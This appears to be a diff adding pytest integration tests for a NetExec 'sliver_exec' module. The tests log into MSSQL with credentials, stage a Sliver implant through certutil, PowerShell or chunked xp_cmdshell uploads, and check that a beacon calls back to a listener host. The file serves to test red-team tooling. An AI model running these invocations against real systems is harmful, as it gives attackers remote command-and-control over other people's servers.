@@ -288,6 +288,113 @@ class TestIntegrationHTTPStaging:
         assert "Payload size:" in result.stdout
 
 
+class TestIntegrationMSSQLStaging:
+    """Integration tests for MSSQL HTTP staging (default behavior)."""
+    
+    def test_mssql_http_staging_default_certutil(self, check_prerequisites, sliver_cleanup):
+        """Test MSSQL defaults to HTTP staging with certutil."""
+        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
+        result = subprocess.run(
+            [
+                NETEXEC_BIN, "mssql",
+                TARGET_HOST,
+                "-u", TARGET_USER,
+                "-p", TARGET_PASS,
+                "-M", "sliver_exec",
+                "-o", f"RHOST={LISTENER_HOST}",
+                f"RPORT={LISTENER_PORT}",
+                "WAIT=120",
+                "CLEANUP=True"
+            ],
+            capture_output=True,
+            text=True,
+            timeout=180,
+        )
+        
+        assert result.returncode == 0, (
+            f"MSSQL HTTP staging (default) failed:\n"
+            f"STDOUT:\n{result.stdout}\n"
+            f"STDERR:\n{result.stderr}"
+        )
+        
+        # Verify HTTP staging was used (default behavior)
+        assert "Starting HTTP listener" in result.stdout or "HTTP download staging" in result.stdout
+        assert "certutil" in result.stdout.lower()
+        assert "Payload size:" in result.stdout
+        
+        # Verify beacon callback
+        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
+    
+    def test_mssql_staging_direct_chunked_upload(self, check_prerequisites, sliver_cleanup):
+        """Test MSSQL with STAGING=direct uses chunked upload (old behavior)."""
+        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
+        result = subprocess.run(
+            [
+                NETEXEC_BIN, "mssql",
+                TARGET_HOST,
+                "-u", TARGET_USER,
+                "-p", TARGET_PASS,
+                "-M", "sliver_exec",
+                "-o", f"RHOST={LISTENER_HOST}",
+                f"RPORT={LISTENER_PORT}",
+                "STAGING=direct",
+                "WAIT=120",
+                "CLEANUP=True"
+            ],
+            capture_output=True,
+            text=True,
+            timeout=180,
+        )
+        
+        assert result.returncode == 0, (
+            f"MSSQL STAGING=direct failed:\n"
+            f"STDOUT:\n{result.stdout}\n"
+            f"STDERR:\n{result.stderr}"
+        )
+        
+        # Verify chunked upload was used (NOT HTTP staging)
+        assert "HTTP listener" not in result.stdout
+        assert "download cradle" not in result.stdout
+        assert "chunked" in result.stdout.lower() or "xp_cmdshell" in result.stdout.lower()
+        
+        # Verify beacon callback
+        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
+    
+    def test_mssql_http_staging_with_powershell_override(self, check_prerequisites, sliver_cleanup):
+        """Test MSSQL HTTP staging with PowerShell download tool override."""
+        assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
+        result = subprocess.run(
+            [
+                NETEXEC_BIN, "mssql",
+                TARGET_HOST,
+                "-u", TARGET_USER,
+                "-p", TARGET_PASS,
+                "-M", "sliver_exec",
+                "-o", f"RHOST={LISTENER_HOST}",
+                f"RPORT={LISTENER_PORT}",
+                "DOWNLOAD_TOOL=powershell",
+                "WAIT=120",
+                "CLEANUP=True"
+            ],
+            capture_output=True,
+            text=True,
+            timeout=180,
+        )
+        
+        assert result.returncode == 0, (
+            f"MSSQL HTTP staging (PowerShell) failed:\n"
+            f"STDOUT:\n{result.stdout}\n"
+            f"STDERR:\n{result.stderr}"
+        )
+        
+        # Verify PowerShell was used instead of certutil
+        assert "Starting HTTP listener" in result.stdout or "HTTP download staging" in result.stdout
+        assert "powershell" in result.stdout.lower()
+        
+        # Verify beacon callback
+        assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
+
+
 class TestIntegrationEdgeCases:
     
     def test_invalid_credentials(self, check_prerequisites):
